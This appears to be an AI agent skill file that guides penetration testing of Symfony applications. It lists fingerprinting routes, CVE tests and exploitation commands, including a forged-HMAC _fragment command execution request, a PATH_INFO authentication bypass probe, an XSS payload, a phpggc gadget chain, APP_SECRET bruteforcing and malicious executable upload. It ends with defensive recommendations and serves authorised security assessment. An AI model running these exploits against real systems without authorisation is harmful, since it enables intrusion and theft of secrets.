---
name: symfony-pentest
description: Pentest Symfony applications - fingerprint versions, test for known CVEs (CVE-2019-18889, CVE-2025-64500, CVE-2024-51736, CVE-2025-47946, CVE-2026-24739), exploit APP_SECRET disclosure via _fragment, test PATH_INFO bypass, check for exposed .env files, debug routes, and common misconfigurations. Use this skill whenever the user mentions Symfony, PHP frameworks, web application security testing, or needs to assess a Symfony-based application (Drupal, Shopware, Ibexa, OroCRM all embed Symfony components).
---

# Symfony Pentest Skill

A comprehensive guide for assessing Symfony applications during security engagements. Symfony powers many enterprise systems, e-commerce platforms, and CMS installations, making it a frequent target.

## When to Use This Skill

Use this skill when:
- You discover a Symfony application during reconnaissance
- You need to test for known Symfony vulnerabilities
- You're assessing PHP web applications that may use Symfony components
- You find debug routes, exposed .env files, or version information
- You need to calculate HMAC tokens for _fragment exploitation
- You're testing authentication bypass or RCE vectors

## Phase 1: Reconnaissance & Fingerprinting

### Identify Symfony Applications

Look for these indicators:

**HTTP Headers:**
- `X-Powered-By: Symfony`
- `X-Debug-Token` or `X-Debug-Token-Link`
- Cookies: `sf_redirect`, `sf_session`, `MOCKSESSID`

**Public Routes (Symfony-specific):**
- `/_profiler` - Symfony Profiler & debug toolbar
- `/_wdt/<token>` - Web Debug Toolbar
- `/_error/{code}.{_format}` - Pretty error pages
- `/app_dev.php`, `/config.php`, `/config_dev.php` - Pre-4.0 dev controllers
- `/_fragment` - ESI/HInclude entry point

**Files to Check:**
- `/.env`, `/.env.local`, `/.env.prod` - Often mis-deployed, leaks APP_SECRET, DB creds, AWS keys
- `/.git`, `.svn`, `.hg` - Source disclosure
- `/var/log/*.log`, `/log/dev.log` - Stack traces if web-root misconfigured
- `/vendor/composer/installed.json` - Exact version info
- `/vendor/phpunit/phpunit/phpunit` - PHPUnit RCE if accessible (CVE-2017-9841)

### Version Detection

```bash
# Check composer files for exact version
curl -s https://target/vendor/composer/installed.json | jq '.[] | select(.name|test("symfony/")) | .name,.version'

# Use Wappalyzer, BuiltWith, or ffuf/feroxbuster with symfony.txt wordlist
ffuf -w symfony.txt -u https://target/FUZZ
```

**Why this matters:** Many 2024-2026 advisories were fixed only in micro releases. Always verify the exact patch level. Note that 5.4 LTS is EOL November 2025, while 7.4 LTS runs until November 2029.

## Phase 2: High-Impact Vulnerability Testing

### CVE-2019-18889: APP_SECRET Disclosure → RCE via _fragment

**Impact:** Remote Code Execution
**Condition:** APP_SECRET is known (from .env leak, profiler, or bruteforce)

Once you have the 32-character APP_SECRET, you can craft an HMAC token to abuse the internal `render()` controller and execute arbitrary Twig templates.

**Exploitation:**

```bash
# Calculate HMAC token for _fragment
python scripts/symfony-hmac-token.py <hex-secret> "template=@App/404.html.twig&filter=raw&_format=html&globals[cmd]=id"

# Use the token in request
curl "https://target/_fragment?template=@App/404.html.twig&filter=raw&_format=html&globals[cmd]=id&_token=<calculated-token>"
```

**Why this works:** The _fragment endpoint validates requests using HMAC-SHA256 with APP_SECRET. If you know the secret, you can forge valid tokens and execute Twig expressions, including system commands via filters.

### CVE-2025-64500: PATH_INFO Auth Bypass

**Impact:** Authentication bypass
**Affected:** < 5.4.50, < 6.4.29, < 7.3.7
**Component:** HttpFoundation

Path normalization could drop the leading `/`, breaking access-control rules that assume paths like `/admin`.

**Test:**

```bash
# Quick probe
curl -i -H 'PATH_INFO: admin/secret' https://target/index.php

# If it returns protected content without redirect/auth, vulnerable
```

**Why this matters:** Applications that check for `/admin` in the path may not catch requests where PATH_INFO is set separately, allowing authenticated-only routes to be accessed without credentials.

### CVE-2024-51736: Windows Process Hijack

**Impact:** Command execution on Windows
**Affected:** < 5.4.50, < 6.4.14, < 7.1.7
**Component:** Process

The Process component searched the current working directory before PATH on Windows. If you can upload `tar.exe`, `cmd.exe`, etc. to a writable web-root and trigger Process (file extraction, PDF generation), you gain command execution.

**Test:**

1. Upload a malicious `tar.exe` or `cmd.exe` to web-root
2. Trigger any Process execution (file operations, console commands)
3. If your binary runs instead of the system one, vulnerable

### CVE-2026-24739: MSYS2/Git-Bash Argument Mangling

**Impact:** Destructive file operations on Windows
**Affected:** < 5.4.51, < 6.4.33, < 7.3.11, < 7.4.5, < 8.0.5
**Component:** Process

When PHP runs from MSYS2 (Git-Bash, mingw), Process fails to quote `=` characters, leading to corrupted paths. Commands like `rmdir` or `del` may target unintended directories.

**Exploitation:**

If you can influence CLI helpers that call Process, craft arguments with `=`:

```bash
# Example: E:/=tmp/delete could cause path re-write
```

### CVE-2025-47946: UX Attribute Injection

**Impact:** XSS
**Affected:** symfony/ux-twig-component & symfony/ux-live-component < 2.25.1

The `{{ attributes }}` render is unescaped, enabling attribute injection. If the app lets users define component attributes (admin CMS, email templating), you can inject scripts.

**Test:**

```twig
{# Attacker-controlled attribute value #}
<live:button {{ attributes|merge({'onclick':'alert(1)'}) }} />
```

If the rendered output echoes the attribute unescaped, XSS succeeds.

### CVE-2024-50340: Runtime env/argv Injection

**Impact:** Environment manipulation
**Affected:** < 5.4.46, < 6.4.14, < 7.1.7
**Condition:** register_argv_argc=On with non-SAPI runtimes

Crafted query strings could flip APP_ENV/APP_DEBUG via argv parsing.

**Test:**

```bash
# Check if these are accepted
curl "https://target/?--env=prod"
curl "https://target/?--debug=1"
```

### CVE-2024-50345: URL Validation / Open Redirect

**Impact:** Open redirect
**Affected:** < 5.4.46, < 6.4.14, < 7.1.7

Special characters in URIs were not validated the same way browsers do, enabling redirects to attacker-controlled domains.

### CVE-2023-46733: Session Fixation

**Impact:** Account hijacking

Authentication guard reused existing session ID after login. If an attacker sets the cookie before the victim authenticates, they hijack the account post-login.

### CVE-2023-46734: Twig Sandbox XSS

**Impact:** XSS in user-controlled templates

In applications exposing user templates (admin CMS, email builder), the `nl2br` filter could bypass the sandbox and inject JS.

### Legacy: Symfony 1 Gadget Chains

**Impact:** RCE via deserialization

```bash
# Generate Phar payload
phpggc symfony/1 system id
```

Check file-upload endpoints and `phar://` wrappers for unserialize() on classes like `sfNamespacedParameterHolder`.

## Phase 3: Exploitation Techniques

### Exposed Symfony Console

If `bin/console` is reachable through php-fpm or direct CLI upload:

```bash
php bin/console about        # Confirm it works
php bin/console cache:clear --no-warmup
```

Use deserialization gadgets inside the cache directory or write a malicious Twig template that executes on the next request.

### APP_SECRET Bruteforce

If you suspect a weak secret:

```bash
# Generate wordlist from target
cewl -d3 https://target -w words.txt

# Bruteforce (requires symfony-secret-bruteforce.py)
symfony-secret-bruteforce.py -w words.txt -c abcdef1234567890 https://target
```

### Debug Route Discovery

Check for exposed debug routes that leak information:

```bash
# Common debug endpoints
curl https://target/_profiler
curl https://target/_wdt/
curl https://target/_error/404.html
```

In Symfony ≤ 3.4, the profiler may expose APP_SECRET directly.

## Phase 4: Defensive Recommendations

When reporting findings, recommend:

1. **Never deploy debug** (`APP_ENV=dev`, `APP_DEBUG=1`) to production; block `/app_dev.php`, `/_profiler`, `/_wdt` in web-server config
2. **Store secrets in env vars** or `vault/secrets.local.php`, never in files accessible through document-root
3. **Enforce patch management** - Subscribe to Symfony security advisories and keep at least LTS patch-level
4. **Windows-specific:** Upgrade immediately to mitigate CVE-2024-51736 & CVE-2026-24739, or add `open_basedir`/`disable_functions` defense-in-depth
5. **Block sensitive paths** in web server config: `/.env`, `/.git`, `/vendor/`, `/var/`

## Useful Tooling

- **ambionics/symfony-exploits** - secret-fragment RCE, debugger routes discovery
- **phpggc** - Ready-made gadget chains for Symfony 1 & 2
- **sf-encoder** - Small helper to compute _fragment HMAC (Go implementation)

## References

- [Ambionics – Symfony "secret-fragment" Remote Code Execution](https://www.ambionics.io/blog/symfony-secret-fragment)
- [Symfony Security Advisory – CVE-2024-51736](https://symfony.com/blog/cve-2024-51736-command-execution-hijack-on-windows-with-process-class)
- [Symfony Blog – CVE-2025-47946](https://symfony.com/blog/symfony-ux-cve-2025-47946-unsanitized-html-attribute-injection-via-componentattributes)
- [Symfony Blog – CVE-2026-24739](https://symfony.com/blog/cve-2026-24739-incorrect-argument-escaping-under-msys2-git-bash-on-windows-can-lead-to-destructive-file-operations)
